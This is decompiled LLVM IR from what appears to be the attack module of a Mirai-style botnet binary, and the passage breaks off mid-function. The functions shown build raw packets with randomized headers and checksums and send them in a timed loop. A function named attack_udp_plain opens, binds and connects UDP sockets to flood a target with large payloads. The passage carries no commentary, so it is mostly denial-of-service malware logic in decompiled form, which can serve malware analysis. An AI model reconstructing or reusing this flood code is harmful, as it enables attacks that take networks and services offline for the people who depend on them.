  %v4_c804 = inttoptr i32 %v3_c804 to i16*
  store i16 0, i16* %v4_c804, align 2
  %v0_c808 = load i32, i32* @r5, align 4
  store i32 %v0_c808, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c810 = call i32 @checksum_generic(i32 %v0_c808, i32 20)
  %v3_c810 = trunc i32 %v2_c810 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c818 = load i32, i32* @r5, align 4
  %v4_c818 = add i32 %v3_c818, 10
  %v5_c818 = inttoptr i32 %v4_c818 to i16*
  store i16 %v3_c810, i16* %v5_c818, align 2
  %v0_c81c = load i32, i32* @r6, align 4
  store i32 %v0_c81c, i32* @r1, align 4
  %v0_c820 = load i32, i32* %r2.global-to-local, align 4
  %v1_c820 = trunc i32 %v0_c820 to i16
  %v3_c820 = add i32 %v0_c81c, 16
  %v4_c820 = inttoptr i32 %v3_c820 to i16*
  store i16 %v1_c820, i16* %v4_c820, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c82c = load i32, i32* @r5, align 4
  store i32 %v0_c82c, i32* %r0.global-to-local, align 4
  %v4_c830 = call i32 @checksum_tcpudp(i32 %v0_c82c, i32 %v0_c81c, i32 10240, i32 40)
  %v5_c830 = trunc i32 %v4_c830 to i16
  store i32 %v4_c830, i32* %r0.global-to-local, align 4
  %v3_c834 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c834, i32* %r3.global-to-local, align 4
  %v3_c838 = mul i32 %v3_c834, 32
  store i32 %v3_c838, i32* %lr.global-to-local, align 4
  %v3_c83c = load i32, i32* @r6, align 4
  %v4_c83c = add i32 %v3_c83c, 16
  %v5_c83c = inttoptr i32 %v4_c83c to i16*
  store i16 %v5_c830, i16* %v5_c83c, align 2
  %v0_c840 = load i32, i32* %lr.global-to-local, align 4
  %v1_c840 = load i32, i32* %r3.global-to-local, align 4
  %tmp70 = mul i32 %v1_c840, -8
  %v5_c840 = add i32 %v0_c840, %tmp70
  store i32 %v5_c840, i32* %lr.global-to-local, align 4
  %v0_c844 = load i32, i32* @r6, align 4
  %v1_c844 = add i32 %v0_c844, 2
  %v2_c844 = inttoptr i32 %v1_c844 to i16*
  %v3_c844 = load i16, i16* %v2_c844, align 2
  %v4_c844 = zext i16 %v3_c844 to i32
  store i32 %v4_c844, i32* @r6, align 4
  %v1_c848 = load i32, i32* @r7, align 4
  %v2_c848 = add i32 %v1_c848, %v5_c840
  store i32 %v2_c848, i32* @lr, align 4
  %v3_c84c = add i32 %v2_c848, 2
  %v4_c84c = inttoptr i32 %v3_c84c to i16*
  store i16 %v3_c844, i16* %v4_c84c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c858 = load i32, i32* @r5, align 4
  store i32 %v0_c858, i32* %r1.global-to-local, align 4
  %v0_c85c = load i32, i32* @r8, align 4
  store i32 %v0_c85c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c864 = load i32, i32* @lr, align 4
  %v6_c86c = call i32 @__libc_sendto(i32 %v0_c85c, i32 %v0_c858, i32 60, i32 16384, i32 %v0_c864, i32 16)
  %v3_c870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c870, i32* %r3.global-to-local, align 4
  %v1_c874 = add i32 %v3_c870, 1
  store i32 %v1_c874, i32* %r0.global-to-local, align 4
  %v1_c878 = load i32, i32* @sb, align 4
  %v9_c878 = icmp eq i32 %v1_c874, %v1_c878
  store i1 %v9_c878, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c874, i32* %stack_var_-44, align 4
  %v6_c880 = icmp slt i32 %v1_c874, %v1_c878
  br i1 %v6_c880, label %dec_label_pc_c884, label %dec_label_pc_c98c

dec_label_pc_c884:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c7a0
  %v1_c894 = phi i32 [ %v1_c874, %dec_label_pc_c800 ], [ 0, %dec_label_pc_c7a0 ]
  %v5_c888 = mul i32 %v1_c894, 24
  %v1_c88c = load i32, i32* @r7, align 4
  %v2_c88c = add i32 %v1_c88c, %v5_c888
  store i32 %v2_c88c, i32* %r3.global-to-local, align 4
  %v1_c890 = add i32 %v2_c88c, 20
  %v2_c890 = inttoptr i32 %v1_c890 to i8*
  %v3_c890 = load i8, i8* %v2_c890, align 1
  %v4_c890 = zext i8 %v3_c890 to i32
  store i32 %v4_c890, i32* %r2.global-to-local, align 4
  %v0_c894 = load i32, i32* @sl, align 4
  %v4_c894 = mul i32 %v1_c894, 4
  %v5_c894 = add i32 %v0_c894, %v4_c894
  %v6_c894 = inttoptr i32 %v5_c894 to i32*
  %v7_c894 = load i32, i32* %v6_c894, align 4
  store i32 %v7_c894, i32* @r5, align 4
  %v2_c898 = icmp ugt i8 %v3_c890, 30
  %v7_c898 = icmp eq i8 %v3_c890, 31
  store i1 %v7_c898, i1* %cpsr_z.global-to-local, align 1
  %v1_c89c = add i32 %v7_c894, 20
  store i32 %v1_c89c, i32* @r6, align 4
  %v2_c8a0 = xor i1 %v7_c898, true
  %v3_c8a0 = and i1 %v2_c898, %v2_c8a0
  br i1 %v3_c8a0, label %dec_label_pc_c7a8, label %dec_label_pc_c8a4

dec_label_pc_c8a4:                                ; preds = %dec_label_pc_c884
  %v1_c8a4 = add i32 %v2_c88c, 16
  %v2_c8a4 = inttoptr i32 %v1_c8a4 to i32*
  %v3_c8a4 = load i32, i32* %v2_c8a4, align 4
  store i32 %v3_c8a4, i32* %r4.global-to-local, align 4
  %v0_c8a8 = call i32 @rand_next()
  store i32 %v0_c8a8, i32* %r0.global-to-local, align 4
  %v3_c8ac = load i32, i32* %stack_var_-44, align 4
  %v5_c8b4 = mul i32 %v3_c8ac, 24
  %v0_c8b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c8b8 = and i32 %v0_c8b8, 16711680
  %v3_c8bc = udiv i32 %v0_c8b8, 16777216
  %v4_c8c0 = udiv i32 %v1_c8b8, 256
  %v5_c8c0 = or i32 %v4_c8c0, %v3_c8bc
  store i32 %v5_c8c0, i32* %r2.global-to-local, align 4
  %v1_c8c4 = load i32, i32* @r7, align 4
  %v2_c8c4 = add i32 %v1_c8c4, %v5_c8b4
  store i32 %v2_c8c4, i32* %r1.global-to-local, align 4
  %v1_c8c8 = and i32 %v0_c8b8, 65280
  store i32 %v1_c8c8, i32* %r3.global-to-local, align 4
  %v1_c8cc = add i32 %v2_c8c4, 20
  %v2_c8cc = inttoptr i32 %v1_c8cc to i8*
  %v3_c8cc = load i8, i8* %v2_c8cc, align 1
  %v4_c8cc = zext i8 %v3_c8cc to i32
  %v5_c8d4 = call i32 @llvm.bswap.i32(i32 %v0_c8b8)
  %v7_c8d8 = lshr i32 %v0_c8a8, %v4_c8cc
  %v8_c8d8 = add i32 %v7_c8d8, %v5_c8d4
  store i32 %v8_c8d8, i32* %r2.global-to-local, align 4
  %v1_c8dc = and i32 %v8_c8d8, 16711680
  store i32 %v1_c8dc, i32* %r0.global-to-local, align 4
  %v1_c8e8 = and i32 %v8_c8d8, 65280
  store i32 %v1_c8e8, i32* %r1.global-to-local, align 4
  %v5_c8f0 = call i32 @llvm.bswap.i32(i32 %v8_c8d8)
  %v1_c8f4 = load i32, i32* @r5, align 4
  %v2_c8f4 = add i32 %v1_c8f4, 16
  %v3_c8f4 = inttoptr i32 %v2_c8f4 to i32*
  store i32 %v5_c8f0, i32* %v3_c8f4, align 4
  store i32 %v6_c4a4, i32* %r3.global-to-local, align 4
  store i1 %v7_c7ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c7ac, label %dec_label_pc_c904, label %dec_label_pc_c7b4

dec_label_pc_c904:                                ; preds = %dec_label_pc_c8a4, %dec_label_pc_c7a8
  %v0_c904 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c90c = load i32, i32* @r5, align 4
  %v2_c90c = add i32 %v1_c90c, 12
  %v3_c90c = inttoptr i32 %v2_c90c to i32*
  store i32 %v0_c904, i32* %v3_c90c, align 4
  store i32 %v3_c520, i32* %r0.global-to-local, align 4
  %v0_c914 = load i32, i32* %r4.global-to-local, align 4
  %v1_c914 = add i32 %v0_c914, -1
  store i32 %v1_c914, i32* @r4, align 4
  %v9_c918 = icmp eq i32 %v3_c520, %v1_c914
  store i1 %v9_c918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c918, label %dec_label_pc_c920, label %dec_label_pc_c7c8

dec_label_pc_c920:                                ; preds = %dec_label_pc_c904, %dec_label_pc_c7b4
  %v0_c920 = call i32 @rand_next()
  %v1_c920 = trunc i32 %v0_c920 to i16
  store i32 %v0_c920, i32* %r0.global-to-local, align 4
  store i32 %v3_c524, i32* %r1.global-to-local, align 4
  %v1_c928 = load i32, i32* @r4, align 4
  %v9_c928 = icmp eq i32 %v3_c524, %v1_c928
  store i1 %v9_c928, i1* %cpsr_z.global-to-local, align 1
  %v3_c92c = load i32, i32* @r5, align 4
  %v4_c92c = add i32 %v3_c92c, 4
  %v5_c92c = inttoptr i32 %v4_c92c to i16*
  store i16 %v1_c920, i16* %v5_c92c, align 2
  br i1 %v9_c928, label %dec_label_pc_c934, label %dec_label_pc_c920.dec_label_pc_c7d4_crit_edge

dec_label_pc_c920.dec_label_pc_c7d4_crit_edge:    ; preds = %dec_label_pc_c920
  %v1_c7d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c7d4

dec_label_pc_c934:                                ; preds = %dec_label_pc_c920, %dec_label_pc_c7c8
  %v0_c934 = call i32 @rand_next()
  %v1_c934 = trunc i32 %v0_c934 to i16
  store i32 %v0_c934, i32* %r0.global-to-local, align 4
  store i32 %v3_c528, i32* %r2.global-to-local, align 4
  %v1_c93c = load i32, i32* @r4, align 4
  %v9_c93c = icmp eq i32 %v3_c528, %v1_c93c
  store i1 %v9_c93c, i1* %cpsr_z.global-to-local, align 1
  %v3_c940 = load i32, i32* @r5, align 4
  %v4_c940 = add i32 %v3_c940, 20
  %v5_c940 = inttoptr i32 %v4_c940 to i16*
  store i16 %v1_c934, i16* %v5_c940, align 2
  br i1 %v9_c93c, label %dec_label_pc_c948, label %dec_label_pc_c934.dec_label_pc_c7e0_crit_edge

dec_label_pc_c934.dec_label_pc_c7e0_crit_edge:    ; preds = %dec_label_pc_c934
  %v1_c7e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c7e0

dec_label_pc_c948:                                ; preds = %dec_label_pc_c934, %dec_label_pc_c7d4
  %v0_c948 = call i32 @rand_next()
  %v1_c948 = trunc i32 %v0_c948 to i16
  store i32 %v0_c948, i32* %r0.global-to-local, align 4
  store i32 %v5_c3e0, i32* %r3.global-to-local, align 4
  %v1_c950 = load i32, i32* @r4, align 4
  %v9_c950 = icmp eq i32 %v5_c3e0, %v1_c950
  store i1 %v9_c950, i1* %cpsr_z.global-to-local, align 1
  %v3_c954 = load i32, i32* @r6, align 4
  %v4_c954 = add i32 %v3_c954, 2
  %v5_c954 = inttoptr i32 %v4_c954 to i16*
  store i16 %v1_c948, i16* %v5_c954, align 2
  br i1 %v9_c950, label %dec_label_pc_c95c, label %dec_label_pc_c948.dec_label_pc_c7ec_crit_edge

dec_label_pc_c948.dec_label_pc_c7ec_crit_edge:    ; preds = %dec_label_pc_c948
  %v1_c7f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c7ec

dec_label_pc_c95c:                                ; preds = %dec_label_pc_c948, %dec_label_pc_c7e0
  %v0_c95c = call i32 @rand_next()
  %v1_c960 = load i32, i32* @r6, align 4
  %v2_c960 = add i32 %v1_c960, 4
  %v3_c960 = inttoptr i32 %v2_c960 to i32*
  store i32 %v0_c95c, i32* %v3_c960, align 4
  store i32 %v6_c3f8, i32* %r0.global-to-local, align 4
  %v1_c968 = load i32, i32* @r4, align 4
  %v9_c968 = icmp eq i32 %v6_c3f8, %v1_c968
  store i1 %v9_c968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c968, label %dec_label_pc_c970, label %dec_label_pc_c7f8

dec_label_pc_c970:                                ; preds = %dec_label_pc_c95c, %dec_label_pc_c7ec
  %v0_c970 = call i32 @rand_next()
  store i32 %v0_c970, i32* %r0.global-to-local, align 4
  %v0_c974 = load i32, i32* @fp, align 4
  %v2_c974 = icmp eq i32 %v0_c974, 0
  store i1 %v2_c974, i1* %cpsr_z.global-to-local, align 1
  %v1_c978 = load i32, i32* @r6, align 4
  %v2_c978 = add i32 %v1_c978, 8
  %v3_c978 = inttoptr i32 %v2_c978 to i32*
  store i32 %v0_c970, i32* %v3_c978, align 4
  br i1 %v2_c974, label %dec_label_pc_c800, label %dec_label_pc_c980

dec_label_pc_c980:                                ; preds = %dec_label_pc_c7f8, %dec_label_pc_c970
  %v0_c980 = call i32 @rand_next()
  %v1_c980 = trunc i32 %v0_c980 to i16
  store i32 %v0_c980, i32* %r0.global-to-local, align 4
  %v3_c984 = load i32, i32* @r6, align 4
  %v4_c984 = add i32 %v3_c984, 18
  %v5_c984 = inttoptr i32 %v4_c984 to i16*
  store i16 %v1_c980, i16* %v5_c984, align 2
  br label %dec_label_pc_c800

dec_label_pc_c98c:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c790
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c990 = call i32 @__GI_time(i32* null)
  store i32 %v2_c990, i32* %r0.global-to-local, align 4
  store i32 %v2_c4b4, i32* %r3.global-to-local, align 4
  %v9_c998 = icmp eq i32 %v2_c4b4, %v2_c990
  store i1 %v9_c998, i1* %cpsr_z.global-to-local, align 1
  %v6_c99c = icmp slt i32 %v2_c4b4, %v2_c990
  br i1 %v6_c99c, label %dec_label_pc_c9a0, label %dec_label_pc_c98c.dec_label_pc_c790_crit_edge

dec_label_pc_c98c.dec_label_pc_c790_crit_edge:    ; preds = %dec_label_pc_c98c
  %v0_c794.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_c790

dec_label_pc_c9a0:                                ; preds = %dec_label_pc_c98c, %entry, %dec_label_pc_c9ac
  %v1_c9a8 = phi i32 [ %v3_c4c8, %entry ], [ %v1_c9b0, %dec_label_pc_c9ac ], [ %v2_c990, %dec_label_pc_c98c ]
  store i32 %v3_c2e4, i32* %r4.global-to-local, align 4
  store i32 %v24_c2e4, i32* %fp.global-to-local, align 4
  store i32 %v27_c2e4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c9a8

dec_label_pc_c9ac:                                ; preds = %dec_label_pc_c4d8
  %v0_c9ac = load i32, i32* @r8, align 4
  store i32 %v0_c9ac, i32* %r0.global-to-local, align 4
  %v1_c9b0 = call i32 @__GI___libc_close(i32 %v0_c9ac)
  store i32 %v1_c9b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c9a0

; uselistorder directives
  uselistorder i32 %v1_c9b0, { 1, 0 }
  uselistorder i32 %v0_c980, { 1, 0 }
  uselistorder i32 %v0_c948, { 1, 0 }
  uselistorder i32 %v0_c934, { 1, 0 }
  uselistorder i32 %v0_c920, { 1, 0 }
  uselistorder i32 %v1_c914, { 1, 2, 0 }
  uselistorder i32 %v0_c8b8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c874, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_c840, { 1, 0 }
  uselistorder i32 %v4_c830, { 1, 0 }
  uselistorder i1 %v3_c7c0, { 1, 0 }
  uselistorder i1 %v7_c7ac, { 2, 1, 0 }
  uselistorder i32 %v2_c780, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c5e8, { 1, 2, 0 }
  uselistorder i32 %v1_c5ac, { 2, 1, 0 }
  uselistorder i32 %v1_c5a8, { 2, 0, 1 }
  uselistorder i32 %v1_c5a4, { 2, 0, 1 }
  uselistorder i32 %v1_c5a0, { 2, 0, 1 }
  uselistorder i32 %v1_c59c, { 2, 0, 1 }
  uselistorder i32 %v3_c524, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_c520, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c514, { 1, 0, 2 }
  uselistorder i1 %v7_c4f8, { 1, 0 }
  uselistorder i1 %v7_c4cc, { 1, 0 }
  uselistorder i32 %v3_c4c8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_c4b4, { 2, 1, 0 }
  uselistorder i32 %v6_c4a4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v6_c3f8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c3e0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c364, { 1, 0 }
  uselistorder i32 %v7_c34c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 11, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 38, 37, 40, 39, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 8, 10, 11, 9, 12, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 36, 33, 34, 35, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 57, { 6, 0, 3, 1, 4, 2, 5 }
  uselistorder i32 58, { 6, 7, 8, 9, 0, 3, 1, 4, 2, 5 }
  uselistorder i32 45, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 46, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 42, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 247, { 1, 2, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_c9a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c980, { 1, 0 }
  uselistorder label %dec_label_pc_c800, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg3, i32* %stack_var_-80, align 4
  %v2_c9e0 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_c9ec = load i32, i32* @fp, align 4
  store i32 %v0_c9ec, i32* %r0.global-to-local, align 4
  %v2_c9f0 = call i32 @calloc(i32 %v0_c9ec, i32 4)
  store i32 65535, i32* @r6, align 4
  %v0_c9fc = load i32, i32* @r5, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_c9f0, i32* @sb, align 4
  %v0_ca0c = load i32, i32* @r4, align 4
  store i32 %v0_ca0c, i32* %r0.global-to-local, align 4
  %v4_ca10 = inttoptr i32 %v0_c9fc to i32*
  %v5_ca10 = call i32 @attack_get_opt_int(i32 %v0_ca0c, i32* %v4_ca10, i32 7, i32 65535)
  %v0_ca14 = load i32, i32* @r5, align 4
  %v0_ca20 = load i32, i32* @r6, align 4
  store i32 %v0_ca20, i32* %r3.global-to-local, align 4
  %v0_ca24 = load i32, i32* @r4, align 4
  store i32 %v0_ca24, i32* %r0.global-to-local, align 4
  %v3_ca28 = urem i32 %v5_ca10, 65536
  store i32 %v3_ca28, i32* @r8, align 4
  %v4_ca2c = inttoptr i32 %v0_ca14 to i32*
  %v5_ca2c = call i32 @attack_get_opt_int(i32 %v0_ca24, i32* %v4_ca2c, i32 6, i32 %v0_ca20)
  %v0_ca30 = load i32, i32* @r5, align 4
  %v3_ca34 = mul i32 %v5_ca2c, 65536
  store i32 %v3_ca34, i32* @sl, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_ca40 = load i32, i32* @r4, align 4
  store i32 %v0_ca40, i32* %r0.global-to-local, align 4
  %v4_ca44 = inttoptr i32 %v0_ca30 to i32*
  %v5_ca44 = call i32 @attack_get_opt_int(i32 %v0_ca40, i32* %v4_ca44, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ca54 = urem i32 %v5_ca44, 65536
  %v0_ca58 = load i32, i32* @r5, align 4
  %v0_ca5c = load i32, i32* @r4, align 4
  store i32 %v0_ca5c, i32* %r0.global-to-local, align 4
  %v4_ca64 = inttoptr i32 %v0_ca58 to i32*
  %v5_ca64 = call i32 @attack_get_opt_int(i32 %v0_ca5c, i32* %v4_ca64, i32 1, i32 1)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ca70 = urem i32 %v5_ca64, 256
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v2_ca8c = call i32 @__GI_time(i32* null)
  store i32 %v2_ca8c, i32* %r0.global-to-local, align 4
  %v0_ca90 = load i32, i32* @sl, align 4
  %v3_ca90 = udiv i32 %v0_ca90, 65536
  %v1_ca94 = load i32, i32* @r6, align 4
  %v9_ca94 = icmp eq i32 %v3_ca90, %v1_ca94
  br i1 %v9_ca94, label %dec_label_pc_cc68, label %bb

bb:                                               ; preds = %entry
  %v4_ca9c = udiv i32 %v0_ca90, 16777216
  store i32 %v4_ca9c, i32* %r3.global-to-local, align 4
  %v1_caa0 = load i32, i32* @r7, align 4
  %v2_caa0 = add i32 %v1_caa0, %v2_ca8c
  store i32 %v2_caa0, i32* %r0.global-to-local, align 4
  %v2_ca98 = mul nuw nsw i32 %v3_ca90, 256
  %v6_caa4 = or i32 %v2_ca98, %v4_ca9c
  %extract.t58 = trunc i32 %v6_caa4 to i16
  br label %dec_label_pc_cab4

dec_label_pc_cab4:                                ; preds = %bb, %dec_label_pc_cc68
  %v6_caa4.sink.off0 = phi i16 [ %extract.t58, %bb ], [ %extract.t59, %dec_label_pc_cc68 ]
  %v0_caa810 = phi i32 [ %v2_caa0, %bb ], [ %v2_caa013, %dec_label_pc_cc68 ]
  %v0_cab4 = load i32, i32* @fp, align 4
  %v2_cab4 = icmp eq i32 %v0_cab4, 0
  br i1 %v2_cab4, label %dec_label_pc_cbec, label %dec_label_pc_cabc

dec_label_pc_cabc:                                ; preds = %dec_label_pc_cab4
  store i32 0, i32* @sl, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v2_cae8 = ptrtoint i32* %stack_var_-56 to i32
  %v4_cb08 = sext i16 %v6_caa4.sink.off0 to i32
  br label %dec_label_pc_cb3c

dec_label_pc_cacc:                                ; preds = %.thread26, %dec_label_pc_cb78
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_cad8 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_cad8, i32* %r0.global-to-local, align 4
  %v7_cadc = icmp eq i32 %v3_cad8, -1
  %v0_cae0 = load i32, i32* @sl, align 4
  %v1_cae0 = add i32 %v0_cae0, 1
  store i32 %v1_cae0, i32* @sl, align 4
  %v0_cae4 = load i32, i32* @r7, align 4
  %v1_cae4 = add i32 %v0_cae4, 24
  store i32 %v1_cae4, i32* @r7, align 4
  %v1_caf0 = load i32, i32* @r6, align 4
  %v2_caf0 = load i32, i32* @sb, align 4
  %v3_caf0 = add i32 %v2_caf0, %v1_caf0
  %v4_caf0 = inttoptr i32 %v3_caf0 to i32*
  store i32 %v3_cad8, i32* %v4_caf0, align 4
  br i1 %v7_cadc, label %dec_label_pc_cc10.loopexit14, label %dec_label_pc_caf8

dec_label_pc_caf8:                                ; preds = %dec_label_pc_cacc
  store i32 2, i32* %stack_var_-56, align 4
  store i32 %v4_cb08, i32* %r3.global-to-local, align 4
  %v0_cb10 = load i32, i32* %r0.global-to-local, align 4
  %v3_cb10 = call i32 @bind(i32 %v0_cb10, i32 %v2_cae8, i32 16)
  store i32 %v3_cb10, i32* %r0.global-to-local, align 4
  %v0_cb14 = load i32, i32* @r5, align 4
  %v1_cb14 = add i32 %v0_cb14, 20
  %v2_cb14 = inttoptr i32 %v1_cb14 to i8*
  %v3_cb14 = load i8, i8* %v2_cb14, align 1
  %v4_cb14 = zext i8 %v3_cb14 to i32
  store i32 %v4_cb14, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_cb14, 32
  br i1 %tmp, label %dec_label_pc_cb8c, label %dec_label_pc_cb20

dec_label_pc_cb20:                                ; preds = %dec_label_pc_caf8
  %v0_cb20 = load i32, i32* @r6, align 4
  %v1_cb20 = load i32, i32* @sb, align 4
  %v2_cb20 = add i32 %v1_cb20, %v0_cb20
  %v3_cb20 = inttoptr i32 %v2_cb20 to i32*
  %v4_cb20 = load i32, i32* %v3_cb20, align 4
  store i32 %v4_cb20, i32* %r0.global-to-local, align 4
  %v3_cb2c = call i32 @__libc_connect(i32 %v4_cb20, i32 %v0_cb14, i32 16)
  store i32 %v3_cb2c, i32* %r0.global-to-local, align 4
  %v0_cb30 = load i32, i32* @sl, align 4
  %v1_cb30 = load i32, i32* @fp, align 4
  %v9_cb30 = icmp eq i32 %v0_cb30, %v1_cb30
  %v0_cb34 = load i32, i32* @r6, align 4
  %v1_cb34 = add i32 %v0_cb34, 4
  store i32 %v1_cb34, i32* @r6, align 4
  br i1 %v9_cb30, label %dec_label_pc_cbec, label %dec_label_pc_cb3c

dec_label_pc_cb3c:                                ; preds = %dec_label_pc_cb8c, %dec_label_pc_cb20, %dec_label_pc_cabc
  store i32 65535, i32* @r4, align 4
  store i32 65535, i32* %r0.global-to-local, align 4
  %v2_cb4c = call i32 @calloc(i32 65535, i32 1)
  store i32 %v2_cb4c, i32* %r0.global-to-local, align 4
  %v0_cb50 = load i32, i32* @r8, align 4
  %v3_cb54 = udiv i32 %v0_cb50, 256
  %v1_cb50 = mul i32 %v0_cb50, 256
  %v4_cb58 = and i32 %v1_cb50, 65280
  %v5_cb58 = or i32 %v4_cb58, %v3_cb54
  store i32 %v5_cb58, i32* %r3.global-to-local, align 4
  %v2_cb5c = load i32, i32* %stack_var_-80, align 4
  %v1_cb60 = load i32, i32* @r7, align 4
  %v2_cb60 = add i32 %v1_cb60, %v2_cb5c
  store i32 %v2_cb60, i32* @r5, align 4
  %v1_cb68 = load i32, i32* @r4, align 4
  %v9_cb68 = icmp eq i32 %v0_cb50, %v1_cb68
  %v1_cb6c = load i32, i32* @r6, align 4
  %v3_cb6c = add i32 %v1_cb6c, %v2_c9e0
  %v4_cb6c = inttoptr i32 %v3_cb6c to i32*
  store i32 %v2_cb4c, i32* %v4_cb6c, align 4
  br i1 %v9_cb68, label %dec_label_pc_cb78, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_cb3c
  %v1_cb7027 = load i32, i32* %r3.global-to-local, align 4
  %v2_cb7028 = trunc i32 %v1_cb7027 to i16
  %v3_cb7029 = load i32, i32* @r5, align 4
  %v4_cb7030 = add i32 %v3_cb7029, 2
  %v5_cb7031 = inttoptr i32 %v4_cb7030 to i16*
  store i16 %v2_cb7028, i16* %v5_cb7031, align 2
  br label %dec_label_pc_cacc

dec_label_pc_cb78:                                ; preds = %dec_label_pc_cb3c
  %v0_cb78 = call i32 @rand_next()
  %v1_cb78 = trunc i32 %v0_cb78 to i16
  store i32 %v0_cb78, i32* %r0.global-to-local, align 4
  %v2_cb7c = load i32, i32* %stack_var_-80, align 4
  store i32 %v2_cb7c, i32* %r3.global-to-local, align 4
  %v1_cb80 = load i32, i32* @r7, align 4
  %v2_cb80 = add i32 %v1_cb80, %v2_cb7c
  store i32 %v2_cb80, i32* @r5, align 4
  %v4_cb84 = add i32 %v2_cb80, 2
  %v5_cb84 = inttoptr i32 %v4_cb84 to i16*
  store i16 %v1_cb78, i16* %v5_cb84, align 2
  br label %dec_label_pc_cacc

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_caf8
  %v1_cb8c = add i32 %v0_cb14, 16
  %v2_cb8c = inttoptr i32 %v1_cb8c to i32*
  %v3_cb8c = load i32, i32* %v2_cb8c, align 4
  store i32 %v3_cb8c, i32* @r4, align 4
  %v0_cb90 = call i32 @rand_next()
  store i32 %v0_cb90, i32* %r0.global-to-local, align 4
  %v0_cb94 = load i32, i32* @r4, align 4
  %v1_cba0 = and i32 %v0_cb94, 65280
  store i32 %v1_cba0, i32* %r3.global-to-local, align 4
  %v0_cba4 = load i32, i32* @r5, align 4
  %v1_cba4 = add i32 %v0_cba4, 20
  %v2_cba4 = inttoptr i32 %v1_cba4 to i8*
